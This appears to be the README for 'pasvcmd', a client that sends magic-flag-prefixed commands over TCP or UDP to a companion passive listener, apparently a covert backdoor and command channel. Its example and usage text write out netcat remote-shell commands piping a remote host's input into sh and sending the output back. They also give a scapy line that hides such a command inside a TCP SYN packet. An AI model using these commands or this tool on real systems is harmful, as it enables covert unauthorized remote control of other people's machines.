pasvcmd
=======
PasvCmd sends commands to [PasvMon](../pasvmon).

It can either send commands via TCP or UDP.  If sending via TCP, a full
handshake is made, either before sending the first command, or before sending
every command. 

Example
-------
```
# ./pasvcmd -p udp 
2016/02/27 21:04:27 "Connected" 192.168.11.11:80 -> 10.100.101.12:80
2016/02/27 21:04:27 Ready.
nc 192.168.11.11 4444 | sh | nc 192.168.11.11 5555
2016/02/27 21:05:27 Sent 64 bytes
```
Note that the number of bytes sent includes the magic flag.

Usage
-----
```
Usage: pasvcmd [options]

Reads commands from the standard input, one per line, and sends them to the
target, prefixed with the magic flag.  If TCP is used, a 3-way handshake will
be made, then the command will be sent.  If UDP is used, a single packet with
the magic flag and command will be sent.  If it is necessary to send the
command in a TCP SYN packet, a scapy line similar to the following may be used:

send(IP(dst="10.100.101.12")/TCP(
	sport=80,dport=80,flags='S')/
	'COMMANDCOMMANDnc 5.4.6.100 4444 | sh | nc 5.4.6.100 5555')

Options:
  -k	Keep connection alive when using tcp
  -l address
    	Local address (default ":80")
  -m flag
    	Magic flag to send (default "COMMANDCOMMAND")
  -p protocol
    	IP protocol, "tcp" or "udp" (default "tcp")
  -r address
    	Remote address (default "10.100.101.12:80")
```
